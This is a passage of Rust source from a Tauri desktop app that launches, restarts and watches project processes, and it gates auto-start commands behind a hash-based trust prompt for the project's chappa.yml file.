/// ([`begin_command_run`], taken before `proc` was borrowed). Callers hold
/// the projects lock.
#[allow(clippy::too_many_arguments)]
fn spawn_process(
    registry: &Registry,
    app: &AppHandle,
    projects: Arc<Mutex<Inner>>,
    sources: &Sources,
    project_id: u32,
    name: &str,
    root: PathBuf,
    settings: &Settings,
    proc: &mut ProcessRuntime,
    record: Option<RecordBinding>,
) -> Result<TermId, String> {
    // The stack runner learns which definition the person trusted on its
    // command line (it runs nothing under any other), and the gitleaks
    // configs (the project's own with its trusted hash, and the one from
    // Settings), so its scans use the app's rules.
    let mut spec = if crate::stack_trust::is_stack_serve(&proc.def) {
        build_spec(
            &crate::stack_trust::launch_def(
                &proc.def,
                proc.trusted_definition.as_deref(),
                &settings.secret_scan_config,
                &proc.scan_config,
            )?,
            &root,
            settings,
        )?
    } else {
        build_spec(&proc.def, &root, settings)?
    };
    // A source gets its loopback address and a fresh token for THIS launch,
    // through the same env the yml variables take (the actor applies
    // `spec.env` over the inherited environment). New on every respawn, so a
    // restarted source proves itself again.
    let is_source = proc.def.is_source();
    if is_source {
        let launch = sources.prepare_launch(project_id, &root, name)?;
        spec.env.extend(launch.env());
        let cwd = spec.cwd.clone().unwrap_or_else(|| root.clone());
        sources.set_launch_folder(
            &root,
            name,
            crate::sources::launch_folder_of(&cwd, &spec.args),
        );
    }
    let channel = proc
        .channel
        .clone()
        .ok_or_else(|| format!("process `{name}` has no frames channel"))?;
    // Project terminals get the same spawn-time settings as
    // interactive ones (both are also live-settable afterwards).
    let cfg = actor_config(spec, None, settings);
    proc.generation += 1;
    proc.spawned_at = Instant::now();
    proc.lifecycle.on(ProcessEvent::Spawned, now_ms());

    // The FIRST spawn arms the restart_when_changed consumer thread, which
    // takes ownership of the receiver; later respawns (auto_restart, watcher)
    // reuse that same long-lived thread.
    let start_watcher = proc.watcher_rx.is_some() && !proc.watcher_started;
    if start_watcher {
        proc.watcher_started = true;
    }
    let projects_for_handler = projects.clone();
    let on_exit = make_exit_handler(
        registry.clone(),
        app.clone(),
        projects,
        project_id,
        name.to_owned(),
    );
    let record_id = record.as_ref().map(|r| r.record_id.clone());
    let created = match proc.term_id {
        Some(id) => registry.respawn_terminal(
            id,
            cfg,
            Arc::new(ChannelSink::new(channel, app.clone())),
            Some(app.clone()),
            name.to_owned(),
            Some(on_exit),
            record,
        ),
        None => registry.create_terminal_with_exit(
            cfg,
            Arc::new(ChannelSink::new(channel, app.clone())),
            Some(app.clone()),
            name.to_owned(),
            Some(on_exit),
            record,
        ),
    };
    let term_id = match created {
        Ok(term_id) => term_id,
        Err(e) => {
            if is_source {
                sources.launch_failed(&root, name, &e);
            }
            return Err(e);
        }
    };
    proc.term_id = Some(term_id);
    if is_source {
        // From here the source has READY_TIMEOUT to bind its port and answer
        // the identity check; the registry row is just "starting" meanwhile.
        sources.launched(&root, name, term_id);
    }
    // The control snapshot (and timer name resolution) know
    // which project owns this terminal.
    registry.set_project(term_id, Some(project_id));
    // Every successful project-process create — first spawn AND
    // auto-restart/watcher respawn (both funnel through here) — broadcasts
    // `term://created` so a webview that does not already know the terminal
    // can adopt it into a rail row.
    emit_created(
        &AppCreatedBroadcast(app.clone()),
        CreatedEvent {
            term_id,
            name: name.to_owned(),
            kind: "process",
            project_id: Some(project_id),
            agent_tool_id: None,
            parent_process_id: None,
            record_id,
            last_run: registry.run_head(term_id),
            record_kind: None,
        },
    );
    if start_watcher {
        let rx = proc
            .watcher_rx
            .take()
            .expect("start_watcher implies a receiver");
        start_watcher_consumer(
            projects_for_handler,
            registry.clone(),
            app.clone(),
            project_id,
            name.to_owned(),
            rx,
        );
    }
    emit_status(
        app,
        project_id,
        name,
        ProcessStatus::Starting,
        proc.exit_code,
        Some(term_id),
    );
    Ok(term_id)
}

/// The pump's exited-event hook: update the project lifecycle, and when an
/// auto_restart process dies (not user-stopped) schedule a backoff respawn.
/// The respawn itself runs on a separate thread so this hook never blocks the
/// pump.
fn make_exit_handler(
    registry: Registry,
    app: AppHandle,
    projects: Arc<Mutex<Inner>>,
    project_id: u32,
    process_name: String,
) -> ExitHandler {
    Arc::new(move |_term_id, code, success| {
        let restart_plan = {
            let mut inner = match projects.lock() {
                Ok(inner) => inner,
                Err(_) => return, // poisoned: nothing left to manage
            };
            if inner.shutting_down {
                return;
            }
            let sources = inner.sources.clone();
            let runtime = match inner.runtimes.get_mut(&project_id) {
                Some(runtime) => runtime,
                None => return,
            };
            let root = runtime.root.clone();
            let proc = match runtime.processes.get_mut(&process_name) {
                Some(proc) => proc,
                None => return,
            };
            proc.exit_code = code;
            let status = proc
                .lifecycle
                .on(ProcessEvent::Exited { success }, now_ms());
            emit_status(&app, project_id, &process_name, status, code, proc.term_id);
            source_gone(
                &sources,
                &root,
                &process_name,
                &proc.def,
                &match code {
                    Some(code) => format!("exited with code {code}"),
                    None => "exited".to_owned(),
                },
            );
            // Restartable: auto_restart is set, this exit is not a user stop
            // (term_id would already be gone — stop takes it), and the process
            // isn't in the stopped state. The generation captured here is the
            // contract the scheduled respawn checks after the backoff sleep.
            let plan = if proc.def.auto_restart
                && proc.lifecycle.status() != ProcessStatus::Stopped
                && proc.term_id.is_some()
            {
                let delay = proc.backoff.delay();
                proc.backoff.record_failure();
                Some((delay, proc.generation))
            } else {
                None
            };
            // The status just moved (exited/failed): a `control_start` parked
            // on a spawn that died immediately gets its answer now.
            inner.notify_changed();
            plan
        };
        if let Some((delay, generation)) = restart_plan {
            let projects = projects.clone();
            let registry = registry.clone();
            let app = app.clone();
            let process_name = process_name.clone();
            std::thread::spawn(move || {
                std::thread::sleep(delay);
                respawn_process(
                    &registry,
                    &app,
                    &projects,
                    project_id,
                    &process_name,
                    generation,
                );
            });
        }
    })
}

/// One auto-restart / watcher respawn. Runs on its own thread (backoff sleep
/// or watcher consumer), locking the projects state fresh. `generation` is
/// the value the scheduling side captured; a user stop/start since then (or a
/// second signal) supersedes this respawn.
fn respawn_process(
    registry: &Registry,
    app: &AppHandle,
    projects: &Arc<Mutex<Inner>>,
    project_id: u32,
    process_name: &str,
    generation: u32,
) {
    let mut inner = match projects.lock() {
        Ok(inner) => inner,
        Err(_) => return, // poisoned: nothing left to manage
    };
    if inner.shutting_down {
        return;
    }
    // Clone the pieces we need BEFORE taking `&mut proc` (borrow discipline:
    // never hold `&ProjectRuntime` alongside `&mut ProcessRuntime`).
    let root = match inner.runtimes.get(&project_id) {
        Some(runtime) => runtime.root.clone(),
        None => return,
    };
    // Settings are re-read on every respawn, so an exec-profile change takes
    // effect on the next restart without reopening the project.
    let settings = inner.launch_settings();
    let Some(proc) = inner
        .runtimes
        .get(&project_id)
        .and_then(|r| r.processes.get(process_name))
    else {
        return;
    };
    if proc.generation != generation {
        return; // superseded by a user action
    }
    if proc.lifecycle.status() == ProcessStatus::Stopped {
        return; // stopped-by-user never restarts
    }
    if proc.term_id.is_none() {
        return; // never started: nothing to respawn
    }
    // Every respawn is a NEW run of the same record, begun before the
    // terminal (and before `proc` is borrowed mutably).
    let record = begin_command_run(&mut inner, project_id, process_name);
    let sources = inner.sources.clone();
    let Some(proc) = inner
        .runtimes
        .get_mut(&project_id)
        .and_then(|r| r.processes.get_mut(process_name))
    else {
        return;
    };
    let _ = spawn_process(
        registry,
        app,
        projects.clone(),
        &sources,
        project_id,
        process_name,
        root,
        &settings,
        proc,
        record,
    );
    // A fresh term_id / generation for a process someone may be waiting on.
    inner.notify_changed();
}

/// ONE consumer thread per process, armed at first spawn. Each debounced
/// restart signal stops + respawns the process through the same
/// generation-checked path the auto_restart backoff uses, so a user action
/// during the debounce window wins. The thread ends when the project closes:
/// dropping `RestartWatcher` disconnects the signal channel.
fn start_watcher_consumer(
    projects: Arc<Mutex<Inner>>,
    registry: Registry,
    app: AppHandle,
    project_id: u32,
    process_name: String,
    rx: Receiver<()>,
) {
    std::thread::spawn(move || {
        while rx.recv().is_ok() {
            // Capture the generation at signal time: a stop that lands after
            // the debounce but before this thread locks still supersedes.
            let generation = match projects.lock() {
                Ok(inner) => inner
                    .runtimes
                    .get(&project_id)
                    .and_then(|r| r.processes.get(&process_name))
                    .map(|p| p.generation),
                Err(_) => return,
            };
            let Some(generation) = generation else { return };
            respawn_process(
                &registry,
                &app,
                &projects,
                project_id,
                &process_name,
                generation,
            );
        }
    });
}

/// One ticker: processes that have been alive ≥500ms with no output graduate
/// from starting → running (the part of the status mapping the registry's
/// first-frame transition doesn't cover — silent daemons produce no frame).
fn spawn_ticker(projects: Arc<Mutex<Inner>>) {
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_millis(200));
        let now = now_ms();
        let mut inner = match projects.lock() {
            Ok(inner) => inner,
            Err(_) => continue,
        };
        if inner.shutting_down {
            return;
        }
        let app = match inner.app.clone() {
            Some(app) => app,
            None => continue,
        };
        let mut graduated = false;
        for (project_id, runtime) in inner.runtimes.iter_mut() {
            for (name, proc) in runtime.processes.iter_mut() {
                if proc.lifecycle.status() == ProcessStatus::Starting
                    && proc.spawned_at.elapsed() >= Duration::from_millis(RUNNING_AFTER_MS)
                {
                    let status = proc.lifecycle.tick(now);
                    graduated = true;
                    emit_status(
                        &app,
                        *project_id,
                        name,
                        status,
                        proc.exit_code,
                        proc.term_id,
                    );
                }
            }
        }
        if graduated {
            inner.notify_changed(); // starting → running is a status change
        }
    });
}

// ---- commands ---------------------------------------------------------------

/// `[{id, name, path, icon}]` — the switcher dropdown rows.
#[tauri::command]
pub fn list_projects(projects: State<'_, Projects>) -> Result<Vec<ProjectInfoDto>, String> {
    let inner = projects.store()?;
    let store = inner.store.as_ref().unwrap();
    Ok(store.list().iter().map(ProjectInfoDto::from).collect())
}

/// At most one native picker per process. Two pickers open at once — a
/// second Browse click while the first dialog was still coming up — crashed
/// the process with heap corruption inside the OS text-services layer, which
/// both dialog threads initialise against shared state. The gate turns the
/// second request into an immediate "cancelled" (`None`), which the frontend
/// already handles; the slot frees itself when the first pick returns,
/// however it returns (chosen, cancelled, or panicked).
pub struct PickerGate(AtomicBool);

/// Held for the lifetime of one picker; dropping it reopens the gate.
pub struct PickerSlot<'a>(&'a PickerGate);

impl Default for PickerGate {
    fn default() -> Self {
        Self::new()
    }
}

impl PickerGate {
    pub const fn new() -> Self {
        PickerGate(AtomicBool::new(false))
    }

    /// `None` when a picker is already open.
    pub fn claim(&self) -> Option<PickerSlot<'_>> {
        self.0
            .compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire)
            .is_ok()
            .then_some(PickerSlot(self))
    }
}

impl Drop for PickerSlot<'_> {
    fn drop(&mut self) {
        self.0 .0.store(false, Ordering::Release);
    }
}

static PICKER_GATE: PickerGate = PickerGate::new();

/// Open the OS folder picker and answer the chosen directory as a PLAIN path
/// string (never a `file://` URI — the frontend feeds it straight back into
/// `add_project`, which does `Path::new(&path)`). `None` = the user cancelled,
/// or a picker is already open (see `PickerGate`).
///
/// `tauri-plugin-dialog` is wired on the Rust side plus the capability only;
/// the npm package is deliberately NOT installed, so ipc.ts stays the only
/// Tauri surface. This command IS that surface.
///
/// The picker is OWNED by the calling window: it opens centred over the app
/// and in front of it, and the OS disables the owner for the dialog's
/// lifetime, so the Browse button cannot be pressed again while it is up. An
/// unowned picker could open behind the app window and read as "nothing
/// happened", inviting exactly the second click the gate exists to absorb.
///
/// ASYNC + blocking pool, deliberately: a synchronous `#[tauri::command]`
/// runs on the MAIN thread, and `blocking_pick_folder` parks its calling
/// thread on a channel while the dialog runs on the platform's UI loop —
/// parked main thread ⇒ deadlock/frozen UI. An async command runs on the
/// async runtime; the park itself still belongs on the blocking pool, not a
/// tokio worker. Resolving the owner handle also round-trips through the
/// main thread, which is only safe from off it.
#[tauri::command]
pub async fn pick_directory(
    window: tauri::Window,
    title: Option<String>,
    start: Option<String>,
) -> Option<String> {
    use tauri_plugin_dialog::DialogExt;
    let slot = PICKER_GATE.claim()?;
    tauri::async_runtime::spawn_blocking(move || {
        // Moved in so the slot is released when the pick returns, on every
        // path out of this closure.
        let _slot = slot;
        let mut builder = window.dialog().file().set_parent(&window);
        if let Some(title) = title {
            builder = builder.set_title(title);
        }
        // A remembered start dir that no longer exists would make some
        // platform pickers open at an arbitrary place (or fail); skip it
        // unless it is a real directory.
        if let Some(start) = start {
            let dir = PathBuf::from(start);
            if dir.is_dir() {
                builder = builder.set_directory(dir);
            }
        }
        builder
            .blocking_pick_folder()
            .and_then(|picked| picked.into_path().ok())
            .map(|p| p.display().to_string())
    })
    .await
    .ok()
    .flatten()
}

/// Register a directory as a project: accepts ANY directory —
/// bare or not — with `chappa.yml` as the project file. `chappa.yml` in the
/// directory is adopted (name/icon/defs); a bare directory is a valid empty
/// project and gains a file only once a command is added. `icon` comes from
/// the project file when one exists.
///
/// `name` is the user's explicit choice from the add-project modal.
/// When it is `None` — or blank after trimming — the name is derived EXACTLY
/// as it was before: the yml's `name`, else the directory name.
///
/// Re-adding an already-registered directory WITH an explicit name applies it
/// as a rename to the stored row (`ProjectStore::rename`) — silently keeping
/// the old name after the user typed a new one read as a broken rename
///. `name: None` (untouched modal field) keeps the
/// return-existing-row behavior untouched.
#[tauri::command]
pub fn add_project(
    projects: State<'_, Projects>,
    path: String,
    name: Option<String>,
) -> Result<ProjectInfoDto, String> {
    let mut inner = projects.store()?;
    let project = add_to_store(inner.store.as_mut().unwrap(), &path, name)?;
    Ok(ProjectInfoDto::from(&project))
}

/// The whole body of `add_project`, minus the `State` — so the name rule is
/// testable against a tempdir store instead of a live Tauri app.
fn add_to_store(
    store: &mut ProjectStore,
    path: &str,
    name: Option<String>,
) -> Result<project_model::projects::Project, String> {
    let root = Path::new(path);
    // `chappa.yml` is the project file: a directory that carries one provides
    // the name/icon and becomes the project's store defs.
    let yml = ProjectYml::load(root);
    // The user's EXPLICIT choice (trimmed; blank counts as absent), kept
    // aside: `ProjectStore::add` is idempotent by canonical path and IGNORES
    // the name for an already-registered directory.
    let explicit = name.map(|n| n.trim().to_owned()).filter(|n| !n.is_empty());
    let resolved = match (&yml, explicit.clone()) {
        (Some(yml), _) => resolve_add_name(explicit.clone(), yml, root)?,
        // Bare directory, no project file: the explicit name, else the folder
        // name.
        (None, Some(name)) => name,
        (None, None) => root
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .ok_or_else(|| "cannot derive a project name".to_owned())?,
    };
    let icon = yml.as_ref().and_then(|y| y.icon.clone());
    let project = store
        .add(PathBuf::from(path), resolved, icon)
        .map_err(|e| e.to_string())?;
    if let Some(explicit) = explicit {
        if project.name != explicit {
            // The directory was already registered under another name (a
            // FRESH add takes `explicit` via resolve_add_name, so a mismatch
            // can only mean the existing-row path): the typed name is a
            // rename of the stored row, not noise to drop.
            store.rename(project.id, explicit)?;
            return store
                .get(project.id)
                .cloned()
                .ok_or_else(|| format!("project {} vanished during rename", project.id));
        }
    }
    // A FRESH row (never touched by the native store) adopts the project
    // file's defs; a re-added existing row keeps its stored data untouched.
    if store.get(project.id).is_some_and(|p| p.processes.is_none()) {
        adopt_project_file(store, project.id, yml.as_ref())?;
        return store
            .get(project.id)
            .cloned()
            .ok_or_else(|| format!("project {} vanished during add", project.id));
    }
    Ok(project)
}

/// A freshly added row adopts the project file's defs into the store (empty
/// when the directory has no `chappa.yml`). The file already exists if it is
/// there, so nothing is written; a bare project simply gains no file.
fn adopt_project_file(
    store: &mut ProjectStore,
    id: u32,
    yml: Option<&ProjectYml>,
) -> Result<(), String> {
    let defs = yml.map(|y| y.processes.clone()).unwrap_or_default();
    store.set_processes(id, defs)
}

/// The name rule. An explicit, non-blank-after-trim `name` wins; anything
/// else (`None`, `""`, whitespace) falls back to the old derivation —
/// the yml's `name`, else the directory name — so "defaults to the folder name
/// exactly as today" holds byte for byte.
fn resolve_add_name(
    explicit: Option<String>,
    yml: &ProjectYml,
    root: &Path,
) -> Result<String, String> {
    if let Some(name) = explicit
        .map(|n| n.trim().to_owned())
        .filter(|n| !n.is_empty())
    {
        return Ok(name);
    }
    yml.name
        .clone()
        .or_else(|| root.file_name().map(|s| s.to_string_lossy().into_owned()))
        .ok_or_else(|| "cannot derive a project name".to_owned())
}

/// Rename a stored project — the switcher's per-row ✎ affordance.
/// Store-only, exactly like `set_notification_level`: nothing here touches the
/// project's project file or its live processes. A blank-after-trim name or an
/// unknown id is an `Err` with nothing persisted (validated in project-model).
#[tauri::command]
pub fn rename_project(projects: State<'_, Projects>, id: u32, name: String) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner.store.as_mut().unwrap().rename(id, name)
}

/// Set a project's badge identity (initials + palette colour). A blank or
/// missing half clears that override back to the name-derived default.
#[tauri::command]
pub fn set_project_identity(
    projects: State<'_, Projects>,
    id: u32,
    initials: Option<String>,
    color: Option<String>,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    inner
        .store
        .as_mut()
        .unwrap()
        .set_identity(id, initials, color)
}

/// Forget a project. Never touches the directory; stops any live processes.
#[tauri::command]
pub fn remove_project(
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
) -> Result<(), String> {
    let mut inner = projects.store()?;
    // Removing a project is the user's own explicit act: what the app kept
    // for its sources goes with it at once (open or not, a saved verdict
    // would block its folder forever otherwise), including the records of
    // sources an untrusted edit had already stopped declaring.
    let mut root = inner
        .store
        .as_ref()
        .unwrap()
        .get(id)
        .map(|p| p.path.clone());
    let mut declared: Vec<(String, ProcessDef)> = inner
        .store
        .as_ref()
        .unwrap()
        .process_defs(id)
        .into_iter()
        .collect();
    if let Some(mut runtime) = inner.runtimes.remove(&id) {
        for (name, proc) in runtime.processes.iter_mut() {
            proc.generation += 1; // cancels any scheduled respawn
            proc.watcher = None;
            proc.watcher_rx = None;
            if let Some(term_id) = proc.term_id.take() {
                registry.close(term_id);
                source_gone(
                    &inner.sources,
                    &runtime.root,
                    name,
                    &proc.def,
                    "was stopped with its project",
                );
            }
            declared.push((name.clone(), proc.def.clone()));
        }
        root = Some(runtime.root.clone());
        inner.notify_changed();
    }
    if let Some(root) = root {
        for name in undeclared_sources(declared.iter().map(|(n, d)| (n.as_str(), d)), |_| false) {
            inner.sources.forget_launched(&root, &name);
        }
        inner.sources.forget_project(&root);
    }
    // The project's records go with its row; their run history goes with
    // them (the one removal path every record takes).
    let record_ids = inner.store.as_ref().unwrap().record_ids_of(id);
    if let Err(e) = inner.ledger.delete_records(&record_ids) {
        log::warn!("remove project {id}: run history not pruned: {e}");
    }
    inner.store.as_mut().unwrap().remove(id)
}

/// Load a stored project's `chappa.yml` fresh and build per-process runtime
/// state (status `stopped`, nothing spawned). Returns the trust-gate answer:
/// when the current project-file hash isn't recorded as trusted, the frontend
/// must show the auto-start commands and call `confirm_project_trust` before
/// starting them.
#[tauri::command]
pub fn open_project(
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
) -> Result<OpenProjectResult, String> {
    let mut inner = projects.store()?;
    let store = inner.store.as_ref().unwrap();
    let stored = store
        .get(id)
        .cloned()
        .ok_or_else(|| format!("no such project: {id}"))?;
    let root = stored.path.clone();
    // `chappa.yml` is the project file, always — processes come from
    // it, the trust gate guards it, and it is watched for external edits.
    let project_file = root.join(project_model::yml::CHAPPA_YML_NAME);
    let mut stack_lines: Vec<String> = Vec::new();
    let mut scan_pin = ProjectScanConfig::None;
    let (processes, yml_hash, trust_pending, name, icon) = if !project_file.exists() {
        // A bare project: no file until the first command is added. Empty
        // defs, no trust gate, no load error — the first mutation
        // materializes chappa.yml, which the armed watcher then reloads.
        (
            IndexMap::new(),
            String::new(),
            false,
            stored.name.clone(),
            stored.icon.clone(),
        )
    } else {
        // Parse and hash ONE read of the file: the hash the trust prompt
        // carries must describe exactly the definitions it lists.
        let (yml, file_hash) = ProjectYml::load_result_with_hash(&root).map_err(|e| {
            format!(
                "cannot load {} in {}: {e}",
                project_model::yml::CHAPPA_YML_NAME,
                root.display()
            )
        })?;
        // A stack runner's definition is part of what is trusted, and so is
        // the project's own gitleaks config.
        let stacks = crate::stack_trust::stack_sources(&root, &yml.processes);
        let scan = ScanConfigSource::of(&root, &yml);
        let yml_hash = crate::stack_trust::project_trust_hash(&file_hash, &stacks, scan.as_ref());
        // Trust is read here, while `store`'s borrow of `inner` is still live —
        // below we need `inner` mutably for the runtime swap.
        let trust_pending = !store.is_trusted(id, &yml_hash);
        let mut processes: IndexMap<String, ProcessRuntime> = yml
            .processes
            .into_iter()
            .map(|(n, def)| (n, fresh_runtime(&root, def)))
            .collect();
        if !trust_pending {
            trust_stack_definitions(&mut processes, &stacks);
        }
        scan_pin = next_scan_pin(&ProjectScanConfig::None, scan.as_ref(), !trust_pending);
        pin_scan_config(&mut processes, &scan_pin);
        stack_lines = crate::stack_trust::prompt_lines(&stacks);
        if let Some(s) = &scan {
            stack_lines.push(s.prompt_entry(stored.trusted_scan_config.as_deref()));
            if let Some(p) = s.problem() {
                log::warn!(
                    "{}: secretScan.config {} is not used: {p}",
                    root.display(),
                    s.rel
                );
            }
        }
        // chappa.yml is committed: a credential written into it is named
        // (file, command, field; never the value) so it can move to the
        // environment.
        for warning in
            inline_credential_warnings(processes.iter().map(|(n, p)| (n.as_str(), &p.def)))
        {
            log::warn!("{warning}");
        }
        let name = yml.name.clone().unwrap_or(stored.name.clone());
        let icon = yml.icon.clone().or(stored.icon.clone());
        (processes, yml_hash, trust_pending, name, icon)
    };

    // Closing any existing runtime makes open_project idempotent: the yml is
    // re-read fresh and previous statuses/watchers are discarded. Live
    // terminals are closed here — the reopen owns the project view, and
    // leaving them running would orphan the process (nothing references it).
    let still_source = |name: &str| processes.get(name).is_some_and(|p| p.def.is_source());
    let declared: Vec<String> = processes
        .iter()
        .filter(|(_, p)| p.def.is_source())
        .map(|(n, _)| n.clone())
        .collect();
    // No file at all is not content anyone trusted.
    let content_trusted = project_file.exists() && !trust_pending;
    if let Some(mut old) = inner.runtimes.remove(&id) {
        for (name, proc) in old.processes.iter_mut() {
            proc.generation += 1;
            proc.watcher = None;
            proc.watcher_rx = None;
            if let Some(term_id) = proc.term_id.take() {
                registry.close(term_id);
                source_gone(
                    &inner.sources,
                    &old.root,
                    name,
                    &proc.def,
                    "was stopped when the project reopened",
                );
            }
        }
        let gone = undeclared_sources(
            old.processes.iter().map(|(n, p)| (n.as_str(), &p.def)),
            still_source,
        );
        settle_undeclared(&inner.sources, &old.root, gone, content_trusted, &declared);
    } else {
        // First open this run: what the file declared when the app last
        // saw it is the working copy in the store.
        let before = inner.store.as_ref().unwrap().process_defs(id);
        let gone = undeclared_sources(before.iter().map(|(n, d)| (n.as_str(), d)), still_source);
        settle_undeclared(&inner.sources, &root, gone, content_trusted, &declared);
    }

    let trust_commands = trust_prompt_entries(&processes, &[], stack_lines);

    // Watch chappa.yml itself so an external edit (or our own
    // write-back) hot-reloads through the diffing path.
    let yml_watcher = match (inner.app.clone(), yml_watcher_for(&root)) {
        (Some(app), Some((watcher, rx))) => {
            start_yml_reload_consumer(projects.arc(), registry.inner().clone(), app, id, rx);
            Some(watcher)
        }
        _ => None,
    };
    let scan_config_watcher = scan_config_watcher_for(
        inner.app.clone(),
        projects.arc(),
        registry.inner().clone(),
        id,
        None,
        &scan_pin,
    );

    let trust_hash = yml_hash.clone();
    // Every command is a durable record from the moment it is opened, so
    // the rows carry a record id before their first start.
    let names: Vec<String> = processes.keys().cloned().collect();
    if let Err(e) = inner
        .store
        .as_mut()
        .unwrap()
        .ensure_command_record_ids(id, &names)
    {
        log::warn!("open project {id}: command record ids not assigned: {e}");
    }
    inner.runtimes.insert(
        id,
        ProjectRuntime {
            root: root.clone(),
            yml_hash,
            processes,
            load_error: None,
            _yml_watcher: yml_watcher,
            worktrees: None,
            scan_config: scan_pin,
            scan_config_watcher,
        },
    );
    // Every process of this project just got a fresh (stopped, no term_id)
    // runtime — including any a `control_start` is currently waiting on.
    inner.notify_changed();
    // An agent may have left a settings file git would commit while the
    // project was closed (here or in a stack worktree): look on open.
    if inner.app.is_some() {
        projects.check_agent_settings(None, root.clone(), Vec::new());
    }
    // The notification fields come off the STORED row (projects.json),
    // never the yml — "chappa.yml is NEVER touched for this".
    let overrides = inner
        .store
        .as_ref()
        .unwrap()
        .get(id)
        .and_then(|p| p.process_overrides.clone());
    Ok(OpenProjectResult {
        project: ProjectInfoDto {
            id,
            name,
            path: root.display().to_string(),
            icon: icon.clone(),
            initials: stored.initials.clone(),
            color: stored.color.clone(),
            notification_level: stored.notification_level.clone(),
            secret_scan: stored.secret_scan,
        },
        trust_pending,
        trust_commands,
        trust_hash,
        processes: inner
            .runtimes
            .get(&id)
            .unwrap()
            .processes
            .iter()
            .map(|(name, p)| ProjectProcessDto::from_process(name, p, overrides.as_ref()))
            .collect(),
    })
}

/// The trust-gate answer. `run = true` records the yml hash as trusted (the
/// frontend then starts the auto-start processes); `false` just declines —
/// the gate re-arms on the next open.
///
/// `hash` is the `trust_hash` the prompt was built from. Run trusts exactly
/// that content: if the file or the loaded definitions have moved on since
/// the prompt was shown, nothing is trusted and this errs — otherwise
/// whatever landed on disk while the dialog sat open would be trusted (and
/// auto-started) unseen. The reload that the change triggers brings its own
/// prompt.
#[tauri::command]
pub fn confirm_project_trust(
    app: AppHandle,
    registry: State<'_, Registry>,
    projects: State<'_, Projects>,
    id: u32,
    run: bool,
    hash: Option<String>,
) -> Result<(), String> {
    let shown = hash;
    let mut inner = projects.store()?;
    let root = inner
        .runtimes
        .get(&id)
        .map(|r| r.root.clone())
        .or_else(|| {
            inner
                .store
                .as_ref()
                .unwrap()
                .get(id)
                .map(|p| p.path.clone())
        })
        .ok_or_else(|| format!("no such project: {id}"))?;
    if run {
        let hash = crate::stack_trust::trust_hash_on_disk(&root).ok_or_else(|| {
            format!(
                "cannot hash {} in {}",
                project_model::yml::CHAPPA_YML_NAME,
                root.display()
            )
        })?;
        let loaded = inner.runtimes.get(&id).map(|r| r.yml_hash.as_str());
        trust_answer_matches(shown.as_deref(), loaded, &hash)?;
        mark_trusted_with_config(inner.store.as_mut().unwrap(), id, &root, hash.clone())?;
        // The sources this content stopped declaring may let go of their
        // kept records now; read the declared ones from exactly what was
        // trusted.
        if let Ok((yml, read)) = ProjectYml::load_result_with_hash(&root) {
            let stacks = crate::stack_trust::stack_sources(&root, &yml.processes);
            let scan = ScanConfigSource::of(&root, &yml);
            if crate::stack_trust::project_trust_hash(&read, &stacks, scan.as_ref()) == hash {
                let declared: Vec<String> = yml
                    .processes
                    .iter()
                    .filter(|(_, d)| d.is_source())
                    .map(|(n, _)| n.clone())
                    .collect();
                inner.sources.content_trusted(&root, &declared);
                // The stack runners start again under what was just trusted
                // (their definition, or the project's gitleaks config).
                let app_handle = inner.app.clone();
                let relaunch = match inner.runtimes.get_mut(&id) {
                    Some(r) => {
                        let mut names = trust_stack_definitions(&mut r.processes, &stacks);
                        r.scan_config = next_scan_pin(&r.scan_config, scan.as_ref(), true);
                        for n in pin_scan_config(&mut r.processes, &r.scan_config) {
                            if !names.contains(&n) {
                                names.push(n);
                            }
                        }
                        r.scan_config_watcher = scan_config_watcher_for(
                            app_handle,
                            projects.arc(),
                            registry.inner().clone(),
                            id,
                            r.scan_config_watcher.take(),
                            &r.scan_config,
                        );
                        names
                    }
                    None => Vec::new(),
                };
                relaunch_locked(&mut inner, &registry, &app, projects.arc(), id, &relaunch);
            }
        }
        Ok(())
    } else {
        Ok(())
    }
}

/// Whether a Run answer may trust `on_disk`: it must be the content the
/// prompt showed (`shown`, when the caller sent it) and the content the open
/// runtime has loaded (`loaded`, when the project is open), since those are
/// the definitions the frontend is about to auto-start.
fn trust_answer_matches(
    shown: Option<&str>,
    loaded: Option<&str>,
    on_disk: &str,
) -> Result<(), String> {
    let stale = shown.is_some_and(|h| h != on_disk) || loaded.is_some_and(|h| h != on_disk);
    if stale {
        return Err(format!(
            "{} changed after the prompt was shown; nothing was trusted",
            project_model::yml::CHAPPA_YML_NAME
        ));
    }
    Ok(())
}

/// The trust prompt for an open project's loaded content, asked again when
/// a start was refused because that content is not trusted (the person
/// skipped the prompt, or an edit is waiting for an answer). It lists every
/// command, not only the auto-start ones: the one being started may be any
/// of them. `hash` is what `confirm_project_trust` must be answered with.
#[derive(Debug, Clone, Serialize)]
pub struct TrustPromptDto {
    pub hash: String,
    pub commands: Vec<String>,
}

#[tauri::command]
pub fn project_trust_prompt(
    projects: State<'_, Projects>,
    id: u32,
) -> Result<TrustPromptDto, String> {
    let inner = projects.store()?;
    let runtime = inner
        .runtimes
        .get(&id)
        .ok_or_else(|| format!("project {id} is not open"))?;
    let mut commands: Vec<String> = runtime
        .processes
        .values()
        .map(|p| trust_line(&p.def))
        .collect();
    let defs: IndexMap<String, ProcessDef> = runtime
        .processes
        .iter()
        .map(|(n, p)| (n.clone(), p.def.clone()))
        .collect();
    commands.extend(crate::stack_trust::prompt_lines(
        &crate::stack_trust::stack_sources(&runtime.root, &defs),
    ));
    if let Ok(yml) = ProjectYml::load_result(&runtime.root) {
        if let Some(scan) = ScanConfigSource::of(&runtime.root, &yml) {
            let last = inner
                .store
                .as_ref()
                .and_then(|s| s.get(id))
                .and_then(|p| p.trusted_scan_config.clone());
            commands.push(scan.prompt_entry(last.as_deref()));
        }
    }
    Ok(TrustPromptDto {
        hash: runtime.yml_hash.clone(),
        commands,
    })
}

/// Current process statuses for the loaded project (reconcile / refresh).
#[tauri::command]
pub fn list_project_processes(
    projects: State<'_, Projects>,
    id: u32,
) -> Result<Vec<ProjectProcessDto>, String> {
    let inner = projects.store()?;
    let runtime = inner
        .runtimes
        .get(&id)
        .ok_or_else(|| format!("project {id} is not open"))?;
    // RAW per-process overrides straight off the stored row. A
    // project that is open but no longer stored (removed mid-session) simply
    // has no overrides.
    let overrides = inner
        .store
        .as_ref()
        .unwrap()
        .get(id)
